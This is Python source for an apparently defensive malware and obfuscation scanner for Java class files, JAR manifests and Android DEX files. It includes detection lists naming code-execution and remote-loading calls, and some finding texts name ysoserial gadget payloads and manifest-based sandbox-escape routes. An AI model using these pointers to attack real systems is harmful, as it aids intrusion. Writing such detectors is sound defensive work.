# ── Class-file analysis: ch02 (class file format) + ch04 (obfuscation) ───────

def _parse_cp_strings(class_data: bytes) -> list:
    """
    Extract all CONSTANT_Utf8 strings from a Java class file constant pool.
    Parses constant pool tags per JVMS §4.4; stops cleanly on malformed data.
    Returns list of decoded str values.
    """
    import struct as _struct
    if len(class_data) < 10 or class_data[:4] != b'\xca\xfe\xba\xbe':
        return []
    try:
        cp_count = _struct.unpack('>H', class_data[8:10])[0]
    except _struct.error:
        return []
    pos = 10
    strings = []
    i = 1
    while i < cp_count and pos < len(class_data):
        tag = class_data[pos]
        pos += 1
        if tag == 1:                    # CONSTANT_Utf8
            if pos + 2 > len(class_data):
                break
            length = _struct.unpack('>H', class_data[pos:pos + 2])[0]
            pos += 2
            strings.append(class_data[pos:pos + length].decode('utf-8', errors='replace'))
            pos += length
        elif tag in (3, 4):             # Integer, Float
            pos += 4
        elif tag in (5, 6):             # Long, Double — consume two pool slots
            pos += 8
            i += 1
        elif tag == 7:                  # Class
            pos += 2
        elif tag == 8:                  # String
            pos += 2
        elif tag in (9, 10, 11, 12):    # Fieldref, Methodref, InterfaceMethodref, NameAndType
            pos += 4
        elif tag == 15:                 # MethodHandle
            pos += 3
        elif tag in (16, 19, 20):       # MethodType, Module, Package
            pos += 2
        elif tag in (17, 18):           # Dynamic, InvokeDynamic
            pos += 4
        else:
            break                       # unknown tag — truncate cleanly
        i += 1
    return strings


def analyze_java_class_file(class_data: bytes) -> list:
    """
    Parse a Java .class file and return security findings.

    Checks:
    - Magic bytes 0xCAFEBABE
    - major_version (bytes 6-7): <52 = MEDIUM OLD_JVM_TARGET
    - Dangerous reflection/exec strings in constant pool: HIGH DANGEROUS_REFLECTION_CONSTANT
    - Serialization markers: HIGH DESERIALIZATION_GADGET_CLASS

    Returns list of {severity, title, detail, host, port}.
    """
    import struct as _struct
    findings = []

    if len(class_data) < 8:
        return findings
    if class_data[:4] != b'\xca\xfe\xba\xbe':
        return findings

    # major_version at bytes 6-7 big-endian (JVMS §4.1)
    major = _struct.unpack('>H', class_data[6:8])[0]
    # 52=Java8, 55=Java11, 61=Java17; anything <52 targets pre-Java-8
    if major < 52:
        _VER = {45: '1.1', 46: '1.2', 47: '1.3', 48: '1.4', 49: '5', 50: '6', 51: '7'}
        jver = _VER.get(major, str(major))
        findings.append({
            'severity': 'MEDIUM',
            'title':    'OLD_JVM_TARGET — legacy class',
            'detail':   (f'major_version={major} targets Java {jver}; '
                         'no modern security defaults (SecurityManager JEP-411, '
                         'strong encapsulation JEP-403); '
                         'likely incompatible with current JVM hardening flags'),
            'host':     'localhost',
            'port':     0,
        })

    cp_strings = _parse_cp_strings(class_data)

    # Dangerous reflection / code-execution constants in the pool
    _DANGEROUS = [
        ('Runtime.exec',   'Runtime command execution via reflection'),
        ('ProcessBuilder',  'ProcessBuilder — OS process spawn'),
        ('Class.forName',  'Class.forName — reflective class loading'),
        ('URLClassLoader', 'URLClassLoader — remote bytecode loading'),
    ]
    seen_d: set = set()
    for s in cp_strings:
        for marker, desc in _DANGEROUS:
            if marker in s and marker not in seen_d:
                seen_d.add(marker)
                findings.append({
                    'severity': 'HIGH',
                    'title':    'DANGEROUS_REFLECTION_CONSTANT',
                    'detail':   f'{desc} — cp literal: {s[:120]}',
                    'host':     'localhost',
                    'port':     0,
                })

    # Serialization gadget markers
    _SERIAL = [
        ('java/io/ObjectInputStream', 'ObjectInputStream reference in constant pool'),
        ('readObject',                'readObject method name in constant pool'),
    ]
    seen_s: set = set()
    for s in cp_strings:
        for marker, desc in _SERIAL:
            if marker in s and marker not in seen_s:
                seen_s.add(marker)
                findings.append({
                    'severity': 'HIGH',
                    'title':    'DESERIALIZATION_GADGET_CLASS',
                    'detail':   f'{desc} — cp literal: {s[:120]}',
                    'host':     'localhost',
                    'port':     0,
                })

    return findings


def detect_java_obfuscation(class_data: bytes) -> list:
    """
    Detect ProGuard / Zelix KlassMaster obfuscation indicators in a .class file.

    Checks:
    - Single-char lowercase identifiers (a, b, c …) in constant pool
    - Synthetic access bridge methods (access$000, access$100 …)
    - Base64-shaped string constants — string encryption residue
    - SourceFile attribute name absent — debug info stripped

    Returns list of {severity, title, detail, host, port}.
    """
    import re as _re
    findings = []

    if len(class_data) < 10 or class_data[:4] != b'\xca\xfe\xba\xbe':
        return findings

    cp_strings = _parse_cp_strings(class_data)

    # Single-char lowercase identifiers — ProGuard/R8 name minification
    single_char = [s for s in cp_strings if len(s) == 1 and 'a' <= s <= 'z']
    if len(single_char) >= 3:
        sample = ', '.join(sorted(set(single_char))[:6])
        findings.append({
            'severity': 'MEDIUM',
            'title':    'PROGUARD_OBFUSCATION — class names mangled',
            'detail':   (f'{len(single_char)} single-char identifier(s) in constant pool '
                         f'(e.g. {sample}); consistent with ProGuard/R8 -dontusemixedcaseclassnames '
                         'name minification; decompiler output will be identifier-ambiguous'),
            'host':     'localhost',
            'port':     0,
        })

    # Synthetic access bridges: access$000, access$100, access$200 …
    _ACCESS = _re.compile(r'^access\$\d+$')
    access_bridges = [s for s in cp_strings if _ACCESS.match(s)]
    if len(access_bridges) >= 2:
        findings.append({
            'severity': 'MEDIUM',
            'title':    'SYNTHETIC_ACCESS_OBFUSCATION',
            'detail':   (f'{len(access_bridges)} synthetic access bridge method(s) detected '
                         f'({", ".join(access_bridges[:5])}); '
                         'compiler-generated bridges expose private members across nested class '
                         'boundaries; obfuscators exploit these as opaque call trampolines'),
            'host':     'localhost',
            'port':     0,
        })

    # Base64-shaped constants — Zelix / custom string encryption
    _B64 = _re.compile(r'^[A-Za-z0-9+/]{16,}={0,2}$')
    b64_hits = [s for s in cp_strings if _B64.match(s)]
    if len(b64_hits) > 5:
        findings.append({
            'severity': 'HIGH',
            'title':    'ENCODED_STRING_CONSTANTS',
            'detail':   (f'{len(b64_hits)} base64-shaped constant(s) in constant pool; '
                         'consistent with Zelix KlassMaster string encryption or custom '
                         'obfuscator runtime decryption; static analysis of plaintext '
                         'strings blocked until decryptor is reversed'),
            'host':     'localhost',
            'port':     0,
        })

    # SourceFile attribute name absent from constant pool — debug info stripped
    if 'SourceFile' not in cp_strings:
        findings.append({
            'severity': 'MEDIUM',
            'title':    'SOURCEFILE_STRIPPED — debug info removed',
            'detail':   ('SourceFile attribute name absent from constant pool; '
                         'decompiled stack traces lose source-file and line-number correlation; '
                         'standard ProGuard output with '
                         '-keepattributes SourceFile,LineNumberTable omitted'),
            'host':     'localhost',
            'port':     0,
        })

    return findings


def detect_java_serialization_gadgets(class_data: bytes) -> list:
    """
    Detect Java deserialization gadget indicators in a .class file.

    Checks:
    - readObject / readResolve / readObjectNoData hooks: HIGH CUSTOM_DESERIALIZATION
    - org/apache/commons/collections: CRITICAL COMMONS_COLLECTIONS_GADGET_LIBRARY
    - org/springframework/core: HIGH SPRING_SERIALIZATION_GADGET
    - com/esotericsoftware/kryo: HIGH KRYO_DESERIALIZATION

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []

    if len(class_data) < 10 or class_data[:4] != b'\xca\xfe\xba\xbe':
        return findings

    cp_strings = _parse_cp_strings(class_data)

    # Custom deserialization hooks — potential gadget chain entry points (JVMS §4.10 / JLS §17.5)
    for hook in ('readObject', 'readResolve', 'readObjectNoData'):
        if hook in cp_strings:
            findings.append({
                'severity': 'HIGH',
                'title':    'CUSTOM_DESERIALIZATION — potential gadget',
                'detail':   (f'{hook}() name in constant pool; '
                             'custom deserialization logic present — inspect for attacker-controlled '
                             'field reads before validation (cf. Bloch, Effective Java §88); '
                             'ysoserial payload applicable if class appears in gadget chain'),
                'host':     'localhost',
                'port':     0,
            })

    # Apache Commons Collections — Frohoff/Gabriel gadget chain (CVE-2015-4852 class)
    _CC = 'org/apache/commons/collections'
    if any(_CC in s for s in cp_strings):
        findings.append({
            'severity': 'CRITICAL',
            'title':    'COMMONS_COLLECTIONS_GADGET_LIBRARY',
            'detail':   (f'{_CC} in constant pool; '
                         'Apache Commons Collections <=3.2.1 / 4.0 contains InvokerTransformer '
                         'gadget chain enabling RCE via ObjectInputStream without authentication; '
                         'ysoserial CommonsCollections1-7 payloads applicable'),
            'host':     'localhost',
            'port':     0,
        })

    # Spring serialization gadget path
    _SP = 'org/springframework/core'
    if any(_SP in s for s in cp_strings):
        findings.append({
            'severity': 'HIGH',
            'title':    'SPRING_SERIALIZATION_GADGET',
            'detail':   (f'{_SP} in constant pool; '
                         'Spring SerializationUtils / DefaultDeserializationExceptionTranslator '
                         'may wrap ObjectInputStream without ClassFilter; '
                         'verify spring.jmx.enabled=false and add JEP-290 serial filter'),
            'host':     'localhost',
            'port':     0,
        })

    # Kryo — no registration required by default
    _KR = 'com/esotericsoftware/kryo'
    if any(_KR in s for s in cp_strings):
        findings.append({
            'severity': 'HIGH',
            'title':    'KRYO_DESERIALIZATION — may accept arbitrary classes',
            'detail':   (f'{_KR} in constant pool; '
                         'Kryo without Kryo.setRegistrationRequired(true) deserializes arbitrary '
                         'registered classes; no type filtering by default; '
                         'check KryoSerializer config for registration enforcement'),
            'host':     'localhost',
            'port':     0,
        })

    return findings


def analyze_jar_manifest(manifest_content: str) -> list:
    """
    Parse a JAR MANIFEST.MF string and return security findings.

    Checks:
    - Permissions: all-permissions: HIGH JAR_ALL_PERMISSIONS
    - Trusted-Library: true: MEDIUM JAR_TRUSTED_LIBRARY
    - Sealed absent/false: MEDIUM JAR_NOT_SEALED
    - Agent-Class / Premain-Class: HIGH JAVA_AGENT_CLASS

    Returns list of {severity, title, detail, host, port}.
    """
    import re as _re
    findings = []

    if not manifest_content:
        return findings

    # Normalise line endings; collapse MANIFEST.MF continuation lines (leading space)
    text = manifest_content.replace('\r\n', '\n').replace('\r', '\n')
    text = _re.sub(r'\n ', '', text)

    # Build case-insensitive attribute dict (main section only)
    attrs: dict = {}
    for line in text.splitlines():
        if ':' in line:
            key, _, val = line.partition(':')
            attrs[key.strip().lower()] = val.strip()

    # all-permissions — full JVM privilege grant (JNLP / legacy applet context)
    perms = attrs.get('permissions', '') + ' ' + attrs.get('java-policy', '')
    if 'all-permissions' in perms.lower():
        findings.append({
            'severity': 'HIGH',
            'title':    'JAR_ALL_PERMISSIONS — sandbox escape',
            'detail':   ('Permissions: all-permissions in MANIFEST.MF; '
                         'grants the JAR unrestricted JVM access equivalent to unsigned native code; '
                         'JNLP/applet sandbox escape vector; '
                         'exploit: sign with self-signed cert or abuse trusted-signer chain'),
            'host':     'localhost',
            'port':     0,
        })

    # Trusted-Library: true — elevated trust delegation to library code
    if attrs.get('trusted-library', '').lower() == 'true':
        findings.append({
            'severity': 'MEDIUM',
            'title':    'JAR_TRUSTED_LIBRARY — elevated trust',
            'detail':   ('Trusted-Library: true in MANIFEST.MF; '
                         'library JAR inherits same permissions as the privileged calling code; '
                         'supply-chain risk: compromise of this dependency = compromise of caller '
                         'without additional privilege escalation required'),
            'host':     'localhost',
            'port':     0,
        })

    # Sealed: absent or not "true" — package injection via classpath shadowing
    if attrs.get('sealed', '').lower() != 'true':
        findings.append({
            'severity': 'MEDIUM',
            'title':    'JAR_NOT_SEALED — package injection possible',
            'detail':   ('Sealed attribute absent or not "true" in MANIFEST.MF; '
                         'attacker can place classes in the same package earlier on the classpath '
                         'and override package-private members; '
                         'classpath shadowing attack applicable in shared-classloader environments'),
            'host':     'localhost',
            'port':     0,
        })

    # Agent-Class / Premain-Class — JVM instrumentation agent (java.lang.instrument API)
    for attr_key in ('agent-class', 'premain-class'):
        val = attrs.get(attr_key, '')
        if val:
            display = attr_key.replace('-', '').title().replace('Class', '-Class')
            findings.append({
                'severity': 'HIGH',
                'title':    'JAVA_AGENT_CLASS — JVM instrumentation',
                'detail':   (f'{display}: {val}; '
                             'JVM instrumentation agent can retransform any loaded class, '
                             'intercept arbitrary method calls, and read heap objects at runtime '
                             'via java.lang.instrument API; '
                             'no SecurityManager check in Java 17+ (JEP-411 removal)'),
                'host':     'localhost',
                'port':     0,
            })

    return findings


def detect_java_anti_disassembly(class_data: bytes) -> list:
    """
    Scan Java .class bytecode for anti-disassembly / decompiler-confusion patterns.

    Checks (all operating on extracted Code-attribute bytecode, not raw class bytes):
    - JSR (0xA8) / JSR_W (0xC9) / RET (0xA9): deprecated since Java 6 (JVMS class version >= 50);
      presence in a modern class requires obfuscator injection to confuse CFG reconstruction.
    - GOTO (0xA7) / GOTO_W (0xC8) immediately followed by TABLESWITCH (0xAA): dead code injected
      after an unconditional branch — decompilers that decode all bytecode sequences produce
      corrupted switch/case output or abort (mirrors x86 rogue-byte insertion, PMA Ch.15).
    - Overlapping exception table ranges: intersecting [start_pc, end_pc) entries or a
      handler_pc inside its own protected range (mirrors SEH chain misuse, PMA Ch.16).
    - WIDE (0xC4) prefix before opcodes outside the valid set (JVMS §6.5): abused by
      obfuscators to corrupt bytecode parsers that extend the following opcode's index width.

    Grounded in: Practical Malware Analysis Ch.15 (anti-disassembly), Ch.16 (obscuring flow
    control) — techniques adapted from x86/PE analysis to JVM bytecode semantics.

    Returns list of {severity, title, detail, host, port}.
    """
    import struct as _struct

    findings = []
    if not class_data or len(class_data) < 10:
        return findings
    if class_data[:4] != b'\xca\xfe\xba\xbe':
        return findings

    major_version = _struct.unpack_from('>H', class_data, 6)[0]  # JVMS §4.1

    # ── Walk constant pool: record position after CP and index of "Code" string ─
    try:
        cp_count = _struct.unpack_from('>H', class_data, 8)[0]
    except _struct.error:
        return findings

    pos = 10
    code_attr_idx = None  # CP index of the "Code" UTF8 entry
    i = 1
    while i < cp_count and pos < len(class_data):
        tag = class_data[pos]
        pos += 1
        if tag == 1:                        # Utf8
            if pos + 2 > len(class_data):
                break
            length = _struct.unpack_from('>H', class_data, pos)[0]
            val = class_data[pos + 2: pos + 2 + length]
            if val == b'Code':
                code_attr_idx = i
            pos += 2 + length
        elif tag in (3, 4):                 # Integer, Float
            pos += 4
        elif tag in (5, 6):                 # Long, Double — two CP slots
            pos += 8
            i += 1
        elif tag in (7, 8, 16, 19, 20):    # Class, String, MethodType, Module, Package
            pos += 2
        elif tag in (9, 10, 11, 12, 17, 18):  # refs + Dynamic/InvokeDynamic
            pos += 4
        elif tag == 15:                     # MethodHandle
            pos += 3
        else:
            break                           # Unknown tag — stop cleanly
        i += 1

    if pos + 6 > len(class_data):
        return findings

    # Skip: access_flags(2) + this_class(2) + super_class(2)
    pos += 6

    # Skip interfaces
    try:
        iface_count = _struct.unpack_from('>H', class_data, pos)[0]
        pos += 2 + iface_count * 2
    except Exception:
        return findings

    # Helper: skip a block of fields or methods (identical wire format)
    def _skip_member_block(data, p, count):
        for _ in range(count):
            if p + 8 > len(data):
                return p
            attr_count = _struct.unpack_from('>H', data, p + 6)[0]
            p += 8
            for _ in range(attr_count):
                if p + 6 > len(data):
                    return p
                attr_len = _struct.unpack_from('>I', data, p + 2)[0]
                p += 6 + attr_len
        return p

    # Skip fields
    try:
        field_count = _struct.unpack_from('>H', class_data, pos)[0]
        pos += 2
        pos = _skip_member_block(class_data, pos, field_count)
    except Exception:
        return findings

    # ── Extract bytecode and exception tables from Code attributes ─────────────
    # Code_attribute (JVMS §4.7.3):
    #   max_stack(2) + max_locals(2) + code_length(4) + code[code_length]
    #   + exception_table_length(2) + exception_table[...] + attrs
    # attr_data received here starts at max_stack (name_index + length already consumed).
    bytecode_chunks = []            # list of bytes objects
    exc_tables = []                 # list of list of (start_pc, end_pc, handler_pc)

    try:
        meth_count = _struct.unpack_from('>H', class_data, pos)[0]
        pos += 2
        for _ in range(meth_count):
            if pos + 8 > len(class_data):
                break
            attr_count = _struct.unpack_from('>H', class_data, pos + 6)[0]
            pos += 8
            for _ in range(attr_count):
                if pos + 6 > len(class_data):
                    break
                attr_name_idx = _struct.unpack_from('>H', class_data, pos)[0]
                attr_len = _struct.unpack_from('>I', class_data, pos + 2)[0]
                attr_data = class_data[pos + 6: pos + 6 + attr_len]
                pos += 6 + attr_len
                # Accept if CP index matches "Code", or (fallback) if we have no index and
                # the payload looks structurally valid for a Code attribute.
                is_code = (code_attr_idx is not None and attr_name_idx == code_attr_idx)
                if not is_code and code_attr_idx is None and len(attr_data) >= 8:
                    # Heuristic: code_length must be non-zero and fit inside attr_data
                    cl = _struct.unpack_from('>I', attr_data, 4)[0]
                    is_code = 0 < cl < 65536 and 8 + cl <= len(attr_data)
                if not is_code or len(attr_data) < 8:
                    continue
                code_len = _struct.unpack_from('>I', attr_data, 4)[0]
                if code_len == 0 or 8 + code_len > len(attr_data):
                    continue
                bc = attr_data[8: 8 + code_len]
                bytecode_chunks.append(bc)
                # Parse exception table
                exc_off = 8 + code_len
                if exc_off + 2 > len(attr_data):
                    continue
                exc_count = _struct.unpack_from('>H', attr_data, exc_off)[0]
                exc_off += 2
                entries = []
                for _ in range(exc_count):
                    if exc_off + 8 > len(attr_data):
                        break
                    start_pc   = _struct.unpack_from('>H', attr_data, exc_off)[0]
                    end_pc     = _struct.unpack_from('>H', attr_data, exc_off + 2)[0]
                    handler_pc = _struct.unpack_from('>H', attr_data, exc_off + 4)[0]
                    entries.append((start_pc, end_pc, handler_pc))
                    exc_off += 8
                if entries:
                    exc_tables.append(entries)
    except Exception:
        pass

    # ── Check 1: JSR / JSR_W / RET — deprecated since Java 6 ─────────────────
    # JVMS §4.10.1.9: class version >= 50 (Java 6) → type-checking verifier rejects jsr/ret.
    # Presence in a version-50+ class indicates obfuscator injection to disrupt decompiler
    # control-flow graph reconstruction — same technique as x86 rogue-byte insertion
    # after a conditional branch (PMA Ch.15 "Anti-Disassembly Techniques").
    jsr_count = sum(bc.count(b'\xa8') + bc.count(b'\xc9') for bc in bytecode_chunks)
    ret_count = sum(bc.count(b'\xa9') for bc in bytecode_chunks)
    if jsr_count > 0 or ret_count > 0:
        ver_note = (
            f'class major_version={major_version} >= 50 (Java 6): verifier rejects these opcodes; '
            'presence requires obfuscator injection'
            if major_version >= 50
            else f'class major_version={major_version} < 50 (pre-Java 6): verify legitimacy'
        )
        findings.append({
            'severity': 'HIGH',
            'title':    'JSR_RET_ANTI_DISASSEMBLY',
            'detail':   (f'JSR/RET in method bytecode: jsr+jsr_w={jsr_count}, ret={ret_count}; '
                         f'{ver_note}; '
                         'JSR/RET create intra-method subroutine call/return that decompilers '
                         '(CFR, Fernflower, Procyon) cannot reconstruct into valid Java source — '
                         'mirrors x86 rogue-byte anti-disassembly: data injected after a branch '
                         'to block sequential disassembly of the real instruction stream (PMA Ch.15)'),
            'host':     'localhost',
            'port':     0,
        })

    # ── Check 2: GOTO/GOTO_W → TABLESWITCH dead code injection ────────────────
    # GOTO (0xA7) is a 3-byte instruction (opcode + 2-byte signed offset);
    # the next instruction therefore starts 3 bytes after the GOTO opcode.
    # TABLESWITCH (0xAA) at that position is unreachable dead code injected to
    # confuse decompilers that decode all bytecode sequences regardless of reachability —
    # matches "impossible disassembly" injection after an unconditional branch (PMA Ch.15).
    # GOTO_W (0xC8) is 5 bytes; dead code starts 5 bytes after the opcode.
    goto_dead_count = 0
    for bc in bytecode_chunks:
        k = 0
        while k < len(bc):
            op = bc[k]
            if op == 0xA7 and k + 3 < len(bc):    # goto: next instr at k+3
                if bc[k + 3] == 0xAA:
                    goto_dead_count += 1
            elif op == 0xC8 and k + 5 < len(bc):  # goto_w: next instr at k+5
                if bc[k + 5] == 0xAA:
                    goto_dead_count += 1
            k += 1  # byte-by-byte scan; count is an indicator, not an exact instruction count
    if goto_dead_count > 0:
        findings.append({
            'severity': 'HIGH',
            'title':    'GOTO_DEAD_CODE — decompiler confusion pattern',
            'detail':   (f'{goto_dead_count} GOTO/GOTO_W -> TABLESWITCH sequence(s) in method bytecode; '
                         'unconditional branch followed immediately by TABLESWITCH (0xAA) is '
                         'unreachable dead code — decompilers reconstructing all bytecode sequences '
                         'produce corrupted switch/case output or terminate; '
                         'mirrors x86 rogue opcode after unconditional jmp/jz (PMA Ch.15 '
                         '"Impossible Disassembly"): bytes hidden from sequential disassembly '
                         'but executed via the true branch target'),
            'host':     'localhost',
            'port':     0,
        })

    # ── Check 3: Overlapping exception table ranges ────────────────────────────
    # JVMS §4.7.3: each exception_table entry covers bytecode range [start_pc, end_pc).
    # Two entries overlap when their ranges intersect (non-identical start/end pairs).
    # A handler_pc inside its own protected range creates a handler-inside-handler loop.
    # Both forms trap decompilers in infinite loops during try/catch block reconstruction —
    # mirrors SEH chain misuse for covert flow transfer (PMA Ch.16 "Misusing SEH").
    overlap_count = 0
    for entries in exc_tables:
        for idx_a, (sp_a, ep_a, hp_a) in enumerate(entries):
            if sp_a >= ep_a:
                continue
            # handler_pc inside the entry's own [start_pc, end_pc)
            if sp_a <= hp_a < ep_a:
                overlap_count += 1
                continue
            # Pair-wise range overlap: [sp_a, ep_a) intersects [sp_b, ep_b)
            for idx_b, (sp_b, ep_b, _) in enumerate(entries):
                if idx_b <= idx_a or sp_b >= ep_b:
                    continue
                if sp_a < ep_b and sp_b < ep_a and not (sp_a == sp_b and ep_a == ep_b):
                    overlap_count += 1
    if overlap_count > 0:
        findings.append({
            'severity': 'HIGH',
            'title':    'OVERLAPPING_EXCEPTION_HANDLER',
            'detail':   (f'{overlap_count} overlapping exception table range(s) in method Code attribute; '
                         'JVMS §4.7.3 exception_table entries with intersecting [start_pc, end_pc) '
                         'ranges cause decompilers to generate malformed try/catch blocks or '
                         'enter infinite loops during control-flow graph reconstruction; '
                         'mirrors x86 SEH chain misuse (PMA Ch.16): exception dispatch hijacked '
                         'as covert flow transfer invisible to static analysis'),
            'host':     'localhost',
            'port':     0,
        })

    # ── Check 4: WIDE (0xC4) before invalid target opcode ─────────────────────
    # JVMS §6.5 wide: valid only before iload/lload/fload/dload/aload (0x15-0x19),
    # istore/lstore/fstore/dstore/astore (0x36-0x3A), ret (0xA9), iinc (0x84).
    # Use before any other opcode is undefined in the spec — abused by obfuscators to
    # corrupt bytecode parsers that consume the wide flag and misparse the following bytes.
    _VALID_AFTER_WIDE = (frozenset(range(0x15, 0x1A))
                         | frozenset(range(0x36, 0x3B))
                         | frozenset([0xA9, 0x84]))
    wide_abuse_count = 0
    for bc in bytecode_chunks:
        for k in range(len(bc) - 1):
            if bc[k] == 0xC4 and bc[k + 1] not in _VALID_AFTER_WIDE:
                wide_abuse_count += 1
    if wide_abuse_count > 0:
        findings.append({
            'severity': 'MEDIUM',
            'title':    'WIDE_OPCODE_OBFUSCATION',
            'detail':   (f'{wide_abuse_count} WIDE (0xC4) prefix before invalid opcode(s); '
                         'JVMS §6.5 restricts the wide prefix to load/store/ret/iinc opcodes; '
                         'wide before any other opcode is undefined — abused by obfuscators to '
                         'corrupt bytecode parsers that extend the following opcode\'s local-variable '
                         'index width, causing misparsed instruction boundaries in subsequent bytes'),
            'host':     'localhost',
            'port':     0,
        })

    return findings


def analyze_dex_file(dex_data: bytes) -> list:
    """
    Analyze an Android DEX (.dex) file for malware indicators.

    Checks:
    - DEX magic "dex\\n" + version string (035-041): INFO with version
    - DEX version < 035: MEDIUM LEGACY_DEX_FORMAT — pre-ART Dalvik-era
    - Adler-32 checksum at offset 8 == 0x00000000: HIGH DEX_CHECKSUM_ZEROED — tampered DEX
    - class_defs_size > 1000: MEDIUM LARGE_CLASS_COUNT — obfuscation indicator
    - Reflection API strings in string pool: HIGH REFLECTION_USAGE_IN_DEX
    - Hardcoded http(s):// URLs: CRITICAL HARDCODED_URL_IN_DEX — C2 or dropper

    DEX header layout (little-endian, AOSP dex-format spec):
      0-3:   magic "dex\\n"
      4-7:   version e.g. "035\\x00"
      8-11:  Adler-32 checksum (uint32 LE)
      12-31: SHA-1 signature (20 bytes)
      32-35: file_size; 36-39: header_size (0x70=112); 40-43: endian_tag
      56-59: string_ids_size; 60-63: string_ids_off
      96-99: class_defs_size; 100-103: class_defs_off

    Packer / dynamic DEX techniques grounded in PMA Ch.18 (packer anatomy, unpacking stub,
    tail jump, import reconstruction) — mapped to their Android equivalents.

    Returns list of {severity, title, detail, host, port}.
    """
    import struct as _struct

    findings = []
    if not dex_data or len(dex_data) < 112:
        return findings
    if dex_data[:4] != b'dex\n':
        return findings

    # ── Version ───────────────────────────────────────────────────────────────
    version_raw = dex_data[4:8]
    try:
        version_str = version_raw[:3].decode('ascii')
        version_int = int(version_str)
    except (UnicodeDecodeError, ValueError):
        version_str = 'UNKNOWN'
        version_int = 0

    findings.append({
        'severity': 'INFO',
        'title':    'DEX_FILE_DETECTED',
        'detail':   (f'DEX magic confirmed; version={version_str}; '
                     'Android Dalvik Executable format; '
                     'ART replaces Dalvik from Android 5.0 / API 21 (DEX version 035); '
                     'full decompilation: dexdump / jadx / apktool'),
        'host':     'localhost',
        'port':     0,
    })

    # ── Legacy DEX version ────────────────────────────────────────────────────
    # DEX version < 035 predates ART; verifier behavioral differences between Dalvik
    # and ART have historically allowed malware to pass Dalvik checks while behaving
    # maliciously under ART strict mode (or vice versa, for anti-analysis stubs).
    if 0 < version_int < 35:
        findings.append({
            'severity': 'MEDIUM',
            'title':    'LEGACY_DEX_FORMAT — pre-ART, possible dalvik-era malware',
            'detail':   (f'DEX version {version_str} < 035; predates ART runtime (Android 5.0); '
                         'Dalvik-era malware exploits verifier differences: code accepted by '
                         'Dalvik byte-code verification may be rejected or behave differently '
                         'under ART strict verification; '
                         'legacy DEX version in a modern APK indicates a packer stub or '
                         'embedded secondary payload — mirrors the unpacking stub / packed '
                         'section technique in PE malware (PMA Ch.18 packer anatomy)'),
            'host':     'localhost',
            'port':     0,
        })

    # ── Parse fixed header fields ─────────────────────────────────────────────
    try:
        checksum        = _struct.unpack_from('<I', dex_data, 8)[0]
        string_ids_size = _struct.unpack_from('<I', dex_data, 56)[0]
        string_ids_off  = _struct.unpack_from('<I', dex_data, 60)[0]
        class_defs_size = _struct.unpack_from('<I', dex_data, 96)[0]
    except _struct.error:
        return findings

    # ── DEX checksum zeroed ───────────────────────────────────────────────────
    # Android runtime skips Adler-32 verification in several loading paths
    # (DexClassLoader from byte array, in-memory DEX injection via InMemoryDexClassLoader).
    # A zeroed checksum indicates post-generation patching without recalculation —
    # the canonical signature of a packer that unpacks, modifies, and executes the DEX
    # in-memory, equivalent to PE OEP transfer without rebuilding the import table (PMA Ch.18).
    if checksum == 0x00000000:
        findings.append({
            'severity': 'HIGH',
            'title':    'DEX_CHECKSUM_ZEROED — tampered DEX',
            'detail':   ('Adler-32 checksum at DEX header offset 8 is 0x00000000; '
                         'runtime skips checksum verification on in-memory DEX loading paths '
                         '(InMemoryDexClassLoader, DexFile from byte[]); '
                         'zero checksum = post-generation modification without recalculation; '
                         'consistent with packer stub that decrypts/unpacks DEX in memory '
                         'and transfers execution without rebuilding integrity fields — '
                         'mirrors PE unpacking stub OEP transfer technique (PMA Ch.18)'),
            'host':     'localhost',
            'port':     0,
        })

    # ── Large class count ─────────────────────────────────────────────────────
    # Heavily obfuscated DEX (DexGuard, ProGuard with custom rules, dexlib2-based tools)
    # generates large numbers of synthetic dispatch/decryption classes.
    if class_defs_size > 1000:
        findings.append({
            'severity': 'MEDIUM',
            'title':    'LARGE_CLASS_COUNT — obfuscation indicator',
            'detail':   (f'class_defs_size={class_defs_size} exceeds 1000; '
                         'obfuscation toolchains (DexGuard, ProGuard, dexlib2-based) generate '
                         'synthetic classes for string decryption, reflection launchers, and '
                         'control-flow dispatch trampolines; '
                         'class count > 1000 in a single DEX is anomalous for legitimate apps '
                         'and is a strong obfuscation toolchain output indicator'),
            'host':     'localhost',
            'port':     0,
        })

    # ── String pool scanning ──────────────────────────────────────────────────
    # DEX string_ids[] is an array of uint32 offsets into the data section, one per string.
    # Each string_data_item: ULEB128 length + MUTF-8 bytes + \x00 terminator.
    # Heuristic: raw byte search from string_ids_off forward covers both the index and
    # data sections, catching embedded string literals without full ULEB128 decoding.
    _search_start = string_ids_off if 0 < string_ids_off < len(dex_data) else 0
    search_region = dex_data[_search_start:]

    # Reflection API strings — primary static-analysis evasion in Android malware.
    # getDeclaredMethod/invoke invocations have no static call-graph entry, equivalent
    # to GetProcAddress dynamic import resolution in packed PE stubs (PMA Ch.18).
    _REFLECTION_MARKERS = [
        b'java/lang/reflect/Method',
        b'getDeclaredMethod',
        b'getDeclaredField',
        b'getDeclaredConstructor',
        b'setAccessible',
        b'java/lang/Class',
        b'invoke',
    ]
    reflection_hits = []
    for marker in _REFLECTION_MARKERS:
        if marker in search_region and marker not in reflection_hits:
            reflection_hits.append(marker)
    if reflection_hits:
        hit_names = [m.decode('ascii', errors='replace') for m in reflection_hits[:5]]
        findings.append({
            'severity': 'HIGH',
            'title':    'REFLECTION_USAGE_IN_DEX',
            'detail':   ('Reflection API strings in DEX string pool: '
                         + ', '.join(hit_names)
                         + '; method invocations via getDeclaredMethod/invoke produce no static '
                         'call-graph edges — equivalent to dynamic import resolution via '
                         'GetProcAddress in packed PE stubs (PMA Ch.18); '
                         'decompilation required to determine invocation targets'),
            'host':     'localhost',
            'port':     0,
        })

    # ── Hardcoded URLs (C2 / dropper) ─────────────────────────────────────────
    url_hits = []
    for prefix in (b'http://', b'https://'):
        idx = 0
        while len(url_hits) < 5:
            found = dex_data.find(prefix, idx)
            if found == -1:
                break
            end = min(found + 120, len(dex_data))
            raw = dex_data[found:end]
            url_str = raw.split(b'\x00')[0].decode('utf-8', errors='replace')
            url_hits.append(url_str)
            idx = found + 1
    if url_hits:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'HARDCODED_URL_IN_DEX — C2 or dropper',
            'detail':   (f'{len(url_hits)} hardcoded URL(s) in DEX; '
                         f'first: {url_hits[0][:120]}; '
                         'hardcoded URLs in DEX string pool are high-confidence C2 beaconing '
                         'or secondary payload download indicators; '
                         'block at egress; cross-reference against threat intel feeds'),
            'host':     'localhost',
            'port':     0,
        })

    return findings


def detect_java_agent_injection(binary_data: bytes) -> list:
